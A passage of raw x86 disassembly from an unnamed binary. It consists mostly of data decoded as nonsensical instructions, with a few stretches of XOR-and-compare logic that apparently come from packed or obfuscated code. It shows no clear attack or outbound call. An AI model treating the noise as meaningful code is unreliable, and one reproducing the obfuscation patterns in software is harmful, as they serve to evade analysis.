  4020ac:	inc    edx
  4020ad:	into   
  4020ae:	cwde   
  4020af:	in     al,dx
  4020b0:	daa    
  4020b1:	xor    BYTE PTR [ebx+0x66],cl
  4020b4:	mov    edx,DWORD PTR [edx+0x55]
  4020b7:	aam    0xf
  4020b9:	pop    esi
  4020ba:	leave  
  4020bb:	sub    ah,BYTE PTR [esi]
  4020bd:	icebp  
  4020be:	sti    
  4020bf:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020c1:	adc    DWORD PTR [ecx-0x6144efb4],edx
  4020c7:	sub    BYTE PTR [eax+eax*8],0x56
  4020cb:	and    BYTE PTR [esi+eiz*4+0x6d],bh
  4020cf:	aaa    
  4020d0:	mov    al,ds:0x6e6e62ca
  4020d5:	cmp    bh,BYTE PTR [edx]
  4020d7:	jbe    0x402101
  4020d9:	(bad)
  4020dc:	mov    ds:0x13587365,eax
  4020e1:	dec    edi
  4020e2:	add    BYTE PTR [ebx+0xcd06cf0],dh
  4020e8:	xchg   ebx,eax
  4020e9:	jl     0x402118
  4020eb:	(bad)  
  4020ec:	xor    BYTE PTR [edi+0x1d107234],bh
  4020f2:	jne    0x402103
  4020f4:	xor    ecx,DWORD PTR [edx-0x44]
  4020f7:	leave  
  4020f8:	push   edi
  4020f9:	add    ebp,edi
  4020fb:	sbb    al,0xcf
  4020fd:	pop    ss
  4020fe:	das    
  4020ff:	les    eax,FWORD PTR [eax+ecx*4+0x1629617e]
  402106:	stc    
  402107:	or     DWORD PTR [ecx-0x576bde1f],ecx
  40210d:	into   
  40210e:	pusha  
  40210f:	sub    eax,0xc84f4be9
  402114:	es jbe 0x4020be
  402117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402118:	jbe    0x4020d4
  40211a:	mov    esp,0x5726fd10
  40211f:	jnp    0x4020ba
  402121:	sub    edi,DWORD PTR [esi-0x44]
  402124:	xchg   esp,eax
  402125:	mov    bh,0xf
  402127:	outs   dx,BYTE PTR ds:[esi]
  402128:	xor    eax,0x7db4e637
  40212d:	xchg   edx,eax
  40212e:	sbb    al,0x16
  402130:	mov    eax,ds:0xd943e9dd
  402135:	call   0xd356:0x8db8ad03
  40213c:	repnz scas al,BYTE PTR es:[edi]
  40213e:	(bad)  
  40213f:	dec    esi
  402140:	scas   eax,DWORD PTR es:[edi]
  402141:	jns    0x40214d
  402143:	jnp    0x402116
  402145:	icebp  
  402146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402147:	rcl    dh,0xa0
  40214a:	loopne 0x40210a
  40214c:	(bad)  
  40214d:	int    0x57
  40214f:	(bad)  
  402150:	jns    0x402179
  402152:	mov    bl,0x69
  402154:	push   cs
  402155:	rol    DWORD PTR [eax-0x3138126b],0x78
  40215c:	icebp  
  40215d:	std    
  40215e:	in     al,dx
  40215f:	dec    eax
  402160:	adc    eax,0xcdaa015
  402165:	sbb    BYTE PTR [ebx-0xfb70e87],0xc9
  40216c:	ss jl  0x402194
  40216f:	cmp    ecx,DWORD PTR [edx+0x48]
  402172:	jecxz  0x4021b4
  402174:	pop    ebp
  402175:	data16 or al,0xe9
  402178:	mov    bl,0x4a
  40217a:	int3   
  40217b:	push   esp
  40217c:	sbb    cl,BYTE PTR [ecx+0xecef4c5]
  402182:	mov    ds:0x99142880,al
  402187:	(bad)  
  402188:	lds    edx,FWORD PTR [eax+0x3e]
  40218b:	jne    0x4021af
  40218d:	push   ds
  40218e:	inc    edx
  40218f:	mov    DWORD PTR [bx],ebp
  402192:	inc    bx
  402194:	pop    ecx
  402195:	sbb    BYTE PTR [ecx],0xf4
  402198:	(bad)  
  40219a:	lods   al,BYTE PTR ds:[esi]
  40219b:	outs   dx,DWORD PTR ds:[esi]
  40219c:	cmovns ebp,DWORD PTR [edi]
  40219f:	and    al,0xec
  4021a1:	or     DWORD PTR [ecx-0xb],edx
  4021a4:	add    DWORD PTR [edi-0x79],0x6db2f312
  4021ab:	jno    0x402210
  4021ad:	imul   esi,edx,0x2ef2c66d
  4021b3:	arpl   WORD PTR [ebp+0x15],ax
  4021b6:	push   edi
  4021b7:	or     ah,al
  4021b9:	retf   
  4021ba:	(bad)  
  4021bb:	stc    
  4021bc:	fidiv  DWORD PTR [edx]
  4021be:	mov    dl,0xd3
  4021c0:	jecxz  0x402192
  4021c2:	mov    ds:0x84a3d7a,al
  4021c7:	xchg   ecx,eax
  4021c8:	sub    eax,0xd6f0d2f5
  4021cd:	lds    edi,FWORD PTR [edi]
  4021cf:	jno    0x402243
  4021d1:	int3   
  4021d2:	inc    ebp
  4021d3:	pop    ebp
  4021d4:	mov    al,ds:0x8be2dabb
  4021d9:	ins    BYTE PTR es:[edi],dx
  4021da:	call   0xb68f:0x31da1e1a
  4021e1:	clc    
  4021e2:	jbe    0x4021b3
  4021e4:	push   ds
  4021e5:	and    eax,0xc9de4e4e
  4021ea:	ret    0x1b70
  4021ed:	push   ds
  4021ee:	mov    cl,0xf0
  4021f0:	fisttp WORD PTR [ebx-0x74ecb5bc]
  4021f6:	sbb    BYTE PTR [esi],0x22
  4021f9:	xchg   ebp,eax
  4021fa:	mov    WORD PTR [eax-0x26bbed35],gs
  402200:	sub    al,0xbc
  402202:	push   0x3ba46e59
  402207:	loope  0x40220a
  402209:	or     BYTE PTR [edx+eiz*2+0x2aee3e96],0x15
  402211:	pop    esp
  402212:	ror    BYTE PTR [edx-0x1],cl
  402215:	mov    DWORD PTR [ebx+0x40399bee],ebp
  40221b:	adc    edi,DWORD PTR [ebx]
  40221d:	and    BYTE PTR [ebx-0x26],bl
  402220:	fistp  WORD PTR [ecx-0x352bea68]
  402226:	jmp    0x4021c9
  402228:	aad    0xb0
  40222a:	mov    ebx,ebx
  40222c:	inc    ebx
  40222d:	mov    eax,ds:0xd2b163b4
  402232:	test   eax,0x694f368f
  402237:	mov    esp,0xaad6e256
  40223c:	stos   BYTE PTR es:[edi],al
  40223d:	repz fwait
  40223f:	das    
  402240:	arpl   WORD PTR [eax],dx
  402242:	mov    ah,bl
  402244:	mov    eax,ds:0xfda4d43d
  402249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40224a:	pop    esp
  40224b:	test   eax,0xa1e3ccf6
  402250:	data16 data16 (bad) 
  402253:	jecxz  0x402286
  402255:	sbb    al,BYTE PTR [ebp+0x3d]
  402258:	push   ds
  402259:	inc    eax
  40225a:	cwde   
  40225b:	xchg   DWORD PTR [edi+0x2c],edi
  40225e:	lods   eax,DWORD PTR ds:[esi]
  40225f:	pushf  
  402260:	mov    bh,0xfc
  402262:	ret    
  402263:	ficomp DWORD PTR [edi+0x5af8e0b2]
  402269:	adc    eax,0x75ce0893
  40226e:	sbb    BYTE PTR ds:0x65dfcbaf,dl
  402274:	xchg   edx,eax
  402275:	and    DWORD PTR [edi],ecx
  402277:	test   BYTE PTR [ecx-0x74fffffc],al
  40227d:	inc    ebp
  40227e:	in     al,dx
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [edi+0x7090c391],esp
  40229f:	add    dh,BYTE PTR [eax+0x70]
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	retf   0x9940
  4022a9:	ds mov al,0x8d
  4022ac:	xchg   ecx,eax
  4022ad:	push   eax
  4022ae:	in     eax,0x10
  4022b0:	loop   0x402238
  4022b2:	xchg   esi,eax
  4022b3:	ins    BYTE PTR es:[edi],dx
  4022b4:	call   0x6cd:0xede85968
  4022bb:	push   esp
  4022bc:	mov    eax,0x3c3cf7dd
  4022c1:	dec    ebx
  4022c2:	sub    DWORD PTR [edi],edx
  4022c4:	pop    edx
  4022c5:	(bad)  
  4022c6:	push   esp
  4022c7:	pop    ebp
  4022c8:	inc    ebx
  4022c9:	sub    al,BYTE PTR [esi]
  4022cb:	and    BYTE PTR [eax+0x41c930b1],ah
  4022d1:	je     0x4022c3
  4022d3:	mov    ebx,DWORD PTR [edx]
  4022d5:	xchg   BYTE PTR [edx],dl
  4022d7:	jne    0x4022e7
  4022d9:	cmp    ch,ch
  4022db:	xchg   ecx,eax
  4022dc:	mov    al,ds:0x30e1a81a
  4022e1:	mov    esi,0x696371d8
  4022e6:	cli    
  4022e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022e8:	mov    ecx,0xaf5dba97
  4022ed:	mov    ebx,0x25dbe7b8
  4022f2:	out    dx,al
  4022f3:	fcmovne st,st(2)
  4022f5:	sbb    al,0x5a
  4022f7:	outs   dx,BYTE PTR ds:[esi]
  4022f8:	xchg   esp,eax
  4022f9:	inc    esi
  4022fa:	add    al,0xf6
  4022fc:	or     esp,ecx
  4022fe:	ss and al,0x22
  402301:	jae    0x402380
  402303:	jne    0x4022e4
  402305:	cld    
  402306:	push   eax
  402307:	adc    al,0x61
  402309:	push   esi
  40230a:	or     ch,BYTE PTR [ecx]
  40230c:	cmp    cl,BYTE PTR [eax+ebx*4-0x33251d10]
  402313:	sti    
  402314:	xor    DWORD PTR [ebp-0x6b],0xa8990429
  40231b:	xor    cl,BYTE PTR [ecx+0x7745ce03]
  402321:	out    dx,eax
  402322:	test   ebx,ebp
  402324:	dec    ebx
  402325:	ins    DWORD PTR es:[edi],dx
  402326:	iret   
  402327:	add    DWORD PTR [ebp+0x2c],edx
  40232a:	sub    bh,al
  40232c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40232d:	je     0x4023a9
  40232f:	push   0x6e63826f
  402334:	add    DWORD PTR [edi+0x40],edi
  402337:	mov    ds:0xb0957a92,eax
  40233c:	mov    eax,DWORD PTR gs:[ebx]
  40233f:	push   ebp
  402340:	dec    eax
  402341:	mov    ds:0xa1e0ede1,al
  402346:	xor    eax,0xc7eb6e5f
  40234b:	and    BYTE PTR [ecx+0x5c641159],cl
  402351:	pusha  
  402352:	in     eax,dx
  402353:	cwde   
  402354:	pop    esp
  402355:	sub    cl,BYTE PTR [ebx-0x2e201a6f]
  40235b:	or     al,0xec
  40235d:	in     eax,dx
  40235e:	sub    edi,DWORD PTR [esi]
  402360:	test   BYTE PTR es:[ecx-0x4d0a01f4],al
  402367:	aam    0x87
  402369:	popa   
  40236a:	nop
  40236b:	jecxz  0x402339
  40236d:	nop
  40236e:	sti    
  40236f:	mov    edx,0xa3a9c508
  402374:	jo     0x40237c
  402376:	inc    eax
  402377:	sub    DWORD PTR [edi-0x37a06204],ecx
  40237d:	out    dx,al
  40237e:	int3   
  40237f:	xlat   BYTE PTR ds:[ebx]
  402380:	sbb    dl,BYTE PTR [ecx-0x667cf084]
  402386:	xor    DWORD PTR [ecx-0x41],ebp
  402389:	bound  eax,QWORD PTR ds:0xc967c42c
  40238f:	add    al,0x88
  402391:	addr16 ja 0x402361
  402394:	mov    dh,0x20
  402396:	mov    al,0x54
  402398:	xchg   esi,eax
  402399:	in     eax,0x74
  40239b:	cmp    al,0x21
  40239d:	loop   0x4023cf
  40239f:	push   ss
  4023a0:	xlat   BYTE PTR ds:[ebx]
  4023a1:	mov    cl,0x82
  4023a3:	and    DWORD PTR [edx-0x674fe1fe],ecx
  4023a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023aa:	mov    eax,0x7dca06f7
  4023af:	fimul  WORD PTR [edx+eax*4+0x6f]
  4023b3:	xor    dl,BYTE PTR [edx+0x4ab4913e]
  4023b9:	jbe    0x4023cd
  4023bb:	(bad)  
  4023bc:	push   ecx
  4023bd:	faddp  st(4),st
  4023bf:	cmp    al,0x2d
  4023c1:	sbb    al,0xe9
  4023c3:	fs jnp 0x402385
  4023c6:	xor    BYTE PTR [ebx+0x34463a3f],dl
  4023cc:	and    BYTE PTR [ebx],dl
  4023ce:	addr16 or ebp,ebp
  4023d1:	loop   0x402360
  4023d3:	push   ebx
  4023d4:	xchg   ecx,eax
  4023d5:	test   DWORD PTR [eax+0x42],edx
  4023d8:	loopne 0x402408
  4023da:	xor    eax,DWORD PTR ds:0x12b772be
  4023e0:	pop    edi
  4023e1:	rcr    DWORD PTR [ecx-0x20274bdd],1
  4023e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023e8:	cli    
  4023e9:	lahf   
  4023ea:	in     eax,dx
  4023eb:	pop    eax
  4023ec:	jmp    0x402411
  4023ee:	jecxz  0x402382
  4023f0:	cmp    BYTE PTR [edi+0x7b4155bd],0x30
  4023f7:	outs   dx,DWORD PTR ds:[esi]
  4023f8:	call   FWORD PTR [esi]
  4023fa:	xor    dl,BYTE PTR [esi+0x4c1dc868]
  402400:	adc    esp,DWORD PTR [edx+0x311e2b99]
  402406:	xor    DWORD PTR [ebx+0x7e],ebx
  402409:	in     eax,0x25
  40240b:	sub    ah,BYTE PTR [ebp-0x70b5d0dc]
  402411:	leave  
  402412:	adc    eax,0x5491c020
  402417:	jns    0x4023ec
  402419:	adc    ah,dl
  40241b:	ins    DWORD PTR es:[edi],dx
  40241c:	pop    ecx
  40241d:	jno    0x4023c7
  40241f:	cmp    esi,0x6aed9634
  402425:	cbw    
  402427:	js     0x4023d3
  402429:	pop    ds
  40242a:	lds    ecx,FWORD PTR [ebx]
  40242c:	add    BYTE PTR [eax+0x2a],al
  40242f:	imul   ebx,DWORD PTR [ebp+0x65],0xffffffad
  402433:	sti    
  402434:	add    bl,bh
  402436:	cmp    al,0x17
  402438:	adc    al,0x89
  40243a:	xchg   esi,eax
  40243b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40243c:	je     0x40247b
  40243e:	jae    0x402413
  402440:	xor    BYTE PTR [ecx+0x13],dh
  402443:	jno    0x40242d
  402445:	adc    ch,ah
  402447:	lea    eax,ds:0x2ca6557a
  40244d:	(bad)  
  40244e:	sbb    eax,0xb44c64b1
  402453:	sbb    BYTE PTR [edi+edi*1],cl
  402456:	lds    esp,FWORD PTR [ecx]
  402458:	fsub   st,st(1)
  40245a:	sbb    eax,DWORD PTR [edx-0xe]
  40245d:	bound  ecx,QWORD PTR [ebx+edx*4-0x9]
  402461:	mov    al,ds:0xfc520c91
  402466:	push   0x8d0fa8cf
  40246b:	push   bp
  40246d:	int    0x1f
  40246f:	(bad)  
  402471:	and    al,bl
  402473:	push   es
  402474:	lahf   
  402475:	jecxz  0x40242b
  402477:	xor    eax,0x950bc3f9
  40247c:	fidiv  DWORD PTR [eax-0x7]
  40247f:	add    eax,0x5112e190
  402484:	mov    bh,0x23
  402486:	cs add bh,dh
  402489:	ret    
  40248a:	les    esi,FWORD PTR [ebx-0x63e813dd]
  402490:	sahf   
  402491:	inc    ebx
  402492:	push   ecx
  402493:	scas   al,BYTE PTR es:[edi]
  402494:	gs aad 0x77
  402497:	and    dl,0xa6
  40249a:	adc    DWORD PTR [ebp-0x7c7cb9d4],edi
  4024a0:	mov    ah,0x1c
  4024a2:	fisub  WORD PTR [eax]
  4024a4:	test   DWORD PTR [esi+eiz*2],eax
  4024a7:	mov    edx,DWORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x29c8ecc9],cl
  4024f4:	in     eax,dx
  4024f5:	jo     0x4024f7
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	inc    edx
  4024fe:	push   esp
  4024ff:	mov    ebx,0xf419ab69
  402504:	sub    ecx,DWORD PTR [ebx-0x424ce0de]
  40250a:	inc    eax
  40250b:	test   cl,ch
  40250d:	fiadd  WORD PTR [eax-0x5186e1cc]
  402513:	jne    0x4024df
  402515:	(bad)  
  402516:	addr16 mov eax,ds:0xff01
  40251a:	aad    0xc4
  40251c:	out    0x4a,eax
  40251e:	mov    edi,DWORD PTR [ebx]
  402520:	gs mov dh,0x98
  402523:	mov    esi,0x814c2fef
  402528:	jle    0x40258e
  40252a:	repnz pop edi
  40252c:	add    al,0xab
  40252e:	adc    ch,dl
  402530:	xchg   DWORD PTR [edx+0x43],edi
  402533:	adc    ecx,esp
  402535:	sub    eax,0x99d67033
  40253a:	inc    esp
  40253b:	cld    
  40253c:	(bad)  
  40253d:	xlat   BYTE PTR ds:[ebx]
  40253e:	xchg   edi,eax
  40253f:	into   
  402540:	sbb    al,al
  402542:	adc    eax,0xebb6fc86
  402547:	ins    BYTE PTR es:[edi],dx
  402548:	jbe    0x402578
  40254a:	add    DWORD PTR [ebx-0x4b],ebp
  40254d:	sub    eax,0x44f617e8
  402552:	mov    eax,0xc9e39d80
  402557:	in     al,dx
  402558:	jp     0x402527
  40255a:	adc    BYTE PTR [esi-0x22],0xf8
  40255e:	sub    ebx,DWORD PTR [edx-0x60edcc30]
  402564:	mov    al,0xca
  402566:	xor    bl,BYTE PTR [ebp-0x466e94a8]
  40256c:	pop    ebp
  40256d:	xchg   edi,eax
  40256e:	push   ds
  40256f:	mul    DWORD PTR [eax]
  402571:	les    eax,FWORD PTR ds:0x1c26f0f3
  402577:	cmp    DWORD PTR [esi-0x574f80d0],ecx
  40257d:	(bad)  
  40257e:	mov    es,WORD PTR [esi]
  402580:	(bad)  
  402581:	stos   BYTE PTR es:[edi],al
  402582:	in     eax,0x88
  402584:	xchg   esp,eax
  402585:	xchg   esp,eax
  402586:	jbe    0x402596
  402588:	mov    ?,WORD PTR [edx]
  40258a:	mov    esi,0xa22b7692
  40258f:	ficomp WORD PTR [edi]
  402591:	mov    BYTE PTR [ebp+0x1f],cl
  402594:	mov    ebp,0x7d6aeb00
  402599:	lods   eax,DWORD PTR ss:[esi]
  40259b:	aad    0x7
  40259d:	and    al,0x1
  40259f:	(bad)  
  4025a0:	aaa    
  4025a1:	sub    esp,edx
  4025a3:	mov    esp,DWORD PTR [edi]
  4025a5:	or     dh,bl
  4025a7:	mov    bl,0x3
  4025a9:	out    dx,al
  4025aa:	push   esp
  4025ab:	mov    ds:0xcba06c4c,eax
  4025b0:	rep lods eax,DWORD PTR ds:[esi]
  4025b2:	adc    ch,dl
  4025b4:	fisttp WORD PTR [edx+edx*1]
  4025b7:	popa   
  4025b8:	inc    ebx
  4025b9:	inc    ebp
  4025ba:	bound  edi,QWORD PTR [edi-0xfa671cc]
  4025c0:	adc    al,0x50
  4025c2:	ins    DWORD PTR es:[edi],dx
  4025c3:	mov    gs,eax
  4025c5:	lods   al,BYTE PTR ds:[esi]
  4025c6:	lar    edx,WORD PTR [esi+eiz*2+0x1888c3e4]
  4025ce:	imul   ecx,DWORD PTR [ebx-0x73273119],0x6a
  4025d5:	mov    edi,0x96d290a9
  4025da:	dec    edi
  4025db:	pusha  
  4025dc:	add    BYTE PTR [ebp+0x159bc1d3],ch
  4025e2:	fnsave [edi+0x3b]
  4025e5:	inc    eax
  4025e6:	jno    0x402640
  4025e8:	dec    ebp
  4025e9:	xchg   DWORD PTR [ebx-0x5],ebx
  4025ec:	jbe    0x402627
  4025ee:	mov    cl,0x67
  4025f0:	mov    dl,0x26
  4025f2:	fcom   QWORD PTR [eax]
  4025f4:	jmp    0x402665
  4025f6:	mov    ds:0x5101bdee,al
  4025fb:	lahf   
  4025fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025fd:	sar    BYTE PTR [edx+edi*8],1
  402600:	stos   BYTE PTR es:[edi],al
  402601:	mov    bh,0xaa
  402603:	jmp    0xb172:0x458d186d
  40260a:	loopne 0x40266b
  40260c:	mov    dh,dl
  40260e:	jb     0x40259c
  402610:	retfw  0xd84e
  402614:	rol    BYTE PTR [ecx],0x4a
  402617:	adc    BYTE PTR [edx*1-0x4b822c5b],bh
  40261e:	mov    eax,ds:0xc9e9a1ec
  402623:	fs pop ss
  402625:	icebp  
  402626:	das    
  402627:	xor    edi,DWORD PTR [edi+0x7fb95562]
  40262d:	jle    0x40269a
  40262f:	add    DWORD PTR [edi+0x7c230477],edx
  402635:	test   al,0xd3
  402637:	iret   
  402638:	xchg   DWORD PTR [ecx+0x4b48be16],ebp
  40263e:	in     al,0xdc
  402640:	retf   0xef81
  402643:	adc    BYTE PTR [edx+0x1449d723],0x4f
  40264a:	jns    0x4025f7
  40264c:	lahf   
  40264d:	jae    0x402654
  40264f:	xchg   esi,eax
  402650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402651:	aad    0x95
  402653:	add    edx,edi
  402655:	jecxz  0x4026aa
  402657:	inc    ecx
  402658:	stos   DWORD PTR es:[edi],eax
  402659:	jmp    0x4026af
  40265b:	dec    edi
  40265c:	mov    ebp,0x24e7eef1
  402661:	iret   
  402662:	std    
  402663:	or     ebp,esp
  402665:	and    DWORD PTR [edx-0x6b1462c7],ebp
  40266b:	jne    0x4026b8
  40266d:	xchg   esi,eax
  40266e:	ins    DWORD PTR es:[edi],dx
  40266f:	cwde   
  402670:	jae    0x402665
  402672:	and    eax,0x4a0f6980
  402677:	sub    eax,0x63a4241f
  40267c:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40267e:	lock loop 0x4026ca
  402681:	ret    0x9b5b
  402684:	iret   
  402685:	fnstenv [eax]
  402687:	sbb    cl,dl
  402689:	mov    dl,0x38
  40268b:	lea    esp,[edx-0x426d062f]
  402691:	div    DWORD PTR [edx-0x8]
  402694:	mov    di,0xf817
  402698:	inc    ecx
  402699:	gs (bad) 
  40269b:	fisubr WORD PTR [ecx+0x3c]
  40269e:	mov    eax,ds:0x43f4367a
  4026a3:	test   eax,0x7055930b
  4026a8:	in     eax,dx
  4026a9:	dec    esi
  4026aa:	stos   BYTE PTR es:[edi],al
  4026ab:	test   al,0xec
  4026ad:	pop    esi
  4026ae:	scas   eax,DWORD PTR es:[edi]
  4026af:	jb     0x4026ff
  4026b1:	or     bh,cl
  4026b3:	jae    0x4026fe
  4026b5:	cdq    
  4026b6:	hlt    
  4026b7:	jmp    0x260b:0x5f26df15
  4026be:	push   ss
  4026bf:	dec    esi
  4026c0:	jo     0x402662
  4026c2:	jne    0x4026e0
  4026c4:	mov    esp,0xa93cc0a6
  4026c9:	sbb    eax,0x1db73ecd
  4026ce:	xor    dl,ch
  4026d0:	out    dx,eax
  4026d1:	in     al,dx
  4026d2:	cmp    esi,DWORD PTR [esi-0x14]
  4026d5:	cmp    eax,0x85063d66
  4026da:	arpl   WORD PTR [edi],ax
  4026dc:	fcomp  DWORD PTR [edi+0x12eda35]
  4026e2:	inc    eax
  4026e3:	push   ss
  4026e4:	leave  
  4026e5:	sub    ebx,DWORD PTR ds:0xaf7ec82c
  4026eb:	sti    
  4026ec:	add    ebx,edx
  4026ee:	popf   
  4026ef:	push   edi
  4026f0:	cwde   
  4026f1:	adc    al,0x2
  4026f3:	test   DWORD PTR [esi],edi
  4026f5:	pop    ecx
  4026f6:	mov    WORD PTR [esi+0x47],?
  4026f9:	mov    cl,0xdf
  4026fb:	lds    ecx,FWORD PTR [ecx]
  4026fd:	mov    eax,DWORD PTR [ebp-0xc]
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x798556ac
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	test   eax,0x55552770
  40276c:	dec    esi
  40276d:	lea    ebp,[edx-0xbb54113]
  402773:	add    bh,BYTE PTR [edi]
  402775:	mov    ah,0x5d
  402777:	push   ecx
  402778:	or     esp,DWORD PTR [edi+0x23]
  40277b:	loope  0x40272d
  40277d:	(bad)  
  40277e:	cmp    ebp,ebx
  402780:	push   ss
  402781:	push   esi
  402782:	sbb    esp,edx
  402784:	jge    0x4027aa
  402786:	dec    ebp
  402787:	ror    DWORD PTR [ebx],1
  402789:	pop    esp
  40278a:	add    DWORD PTR [esi-0x74],edi
  40278d:	ds stc 
  40278f:	jge    0x4027b6
  402791:	test   cl,al
  402793:	xchg   edi,eax
  402794:	cmp    BYTE PTR cs:[esi-0x45],cl
  402798:	push   edx
  402799:	jg     0x40271f
  40279b:	jno    0x4027f2
  40279d:	leave  
  40279e:	std    
  40279f:	mov    ds:0x3f08d558,eax
  4027a4:	dec    esp
  4027a5:	xchg   edi,eax
  4027a6:	fld    QWORD PTR [esi+0x51]
  4027a9:	out    0xec,al
  4027ab:	xor    eax,0xb7b8db57
  4027b0:	jmp    0x4027c9
  4027b2:	shr    DWORD PTR [ebx-0x4482ab0b],0x66
  4027b9:	push   cs
  4027ba:	in     al,dx
  4027bb:	fwait
  4027bc:	lods   al,BYTE PTR ds:[esi]
  4027bd:	mov    ebp,0xc1716a1f
  4027c2:	jmp    0xc42a:0xc21a4d5c
  4027c9:	adc    BYTE PTR [edi+0x5f],ch
  4027cc:	pop    ss
  4027cd:	out    dx,al
  4027ce:	lods   al,BYTE PTR ds:[esi]
  4027cf:	in     eax,0xb
  4027d1:	xchg   ebp,eax
  4027d2:	mov    cl,0xab
  4027d4:	out    dx,eax
  4027d5:	or     eax,DWORD PTR [ebx]
  4027d7:	scas   al,BYTE PTR es:[edi]
  4027d8:	cli    
  4027d9:	imul   esp,DWORD PTR [ecx+0x78],0x23
  4027dd:	aad    0xdb
  4027df:	cmc    
  4027e0:	test   BYTE PTR [esi+0x50],al
  4027e3:	fldcw  WORD PTR [ebp+eax*1-0x4ea64d2e]
  4027ea:	pop    esp
  4027eb:	and    BYTE PTR [esi-0x53973206],al
  4027f1:	mov    bl,0x4a
  4027f3:	scas   eax,DWORD PTR es:[edi]
  4027f4:	repz fist WORD PTR [eax]
  4027f7:	cmc    
  4027f8:	and    eax,0x8f4ef8ac
  4027fd:	push   edx
  4027fe:	pop    esp
  4027ff:	cdq    
  402800:	adc    al,BYTE PTR [ebx]
  402802:	out    dx,eax
  402803:	sbb    DWORD PTR [ecx],edx
  402805:	sub    ecx,DWORD PTR [ebx-0x63]
  402808:	pop    ebx
  402809:	inc    edx
  40280a:	add    ebx,esp
  40280c:	and    esi,DWORD PTR [esp+ecx*2-0x21]
  402810:	xchg   ebx,eax
  402811:	xchg   BYTE PTR [edi-0x33],dh
  402814:	or     eax,0x53202c3a
  402819:	xlat   BYTE PTR ds:[ebx]
  40281a:	or     dh,BYTE PTR [edx+0x5f495312]
  402820:	cld    
  402821:	mov    DWORD PTR [eax+0x75],ebp
  402824:	push   edi
  402825:	fcompp 
  402827:	inc    esp
  402828:	xchg   ebx,eax
  402829:	push   esp
  40282a:	mov    al,ds:0x39f1aaf3
  40282f:	cld    
  402830:	retf   
  402831:	push   cs
  402832:	sbb    dl,bh
  402834:	sub    bl,BYTE PTR [edi+0x32]
  402837:	popa   
  402838:	aam    0x4e
  40283a:	arpl   WORD PTR [ebp+0x166b253d],dx
  402840:	sbb    DWORD PTR gs:[ebx+ebx*4-0x75],eax
  402845:	or     esi,0x374aacfd
  40284b:	push   ds
  40284c:	mov    DWORD PTR [eax+0x70],edi
  40284f:	inc    bl
  402851:	push   esp
  402852:	out    0xc1,al
  402854:	or     dh,0x2e
  402857:	(bad)  
  402858:	lea    ebx,[ebx+0x2d]
  40285b:	sub    edx,DWORD PTR [ecx]
  40285d:	inc    DWORD PTR [ebx]
  40285f:	xor    ah,BYTE PTR [ebp+0x0]
  402862:	retf   
  402863:	cli    
  402864:	paddsb mm0,QWORD PTR [eax-0x57]
  402868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402869:	pop    edx
  40286a:	dec    ebx
  40286b:	dec    ebx
  40286c:	push   ds
  40286d:	add    ebx,edi
  40286f:	sub    eax,0xcc5c1b74
  402874:	pop    eax
  402875:	je     0x40287b
  402877:	popf   
  402878:	es adc esi,esi
  40287b:	dec    ebp
  40287c:	dec    edx
  40287d:	jae    0x4028e3
  40287f:	es pusha 
  402881:	ret    
  402882:	mov    ebx,0xa795e559
  402887:	pop    eax
  402888:	or     esi,ebp
  40288a:	retf   0xab31
  40288d:	mov    edi,0xa82b60c5
